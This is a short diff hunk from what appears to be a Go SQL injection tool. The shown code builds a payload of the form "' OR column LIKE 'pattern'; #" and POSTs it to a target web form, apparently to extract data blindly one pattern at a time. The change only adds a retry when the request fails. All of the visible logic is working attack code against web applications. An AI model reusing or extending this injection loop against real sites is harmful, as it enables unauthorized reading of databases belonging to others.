@@ -103,6 +103,9 @@ YJGS8P"Y888P"Y888P"Y888P"Y8888P
 			attempt := fmt.Sprintf("' OR %s LIKE '%s'; #", targetColumn, pattern)
 			values, err := url.ParseQuery(fmt.Sprintf("%s=%s&%s", inputName, url.QueryEscape(attempt), extraInputs))
 			res, err := http.PostForm(targetUrl, values)
+			if err != nil {
+				res, err = http.PostForm(targetUrl, values)
+			}
 			handleError("Cannot post form", err)
 
 			defer res.Body.Close()
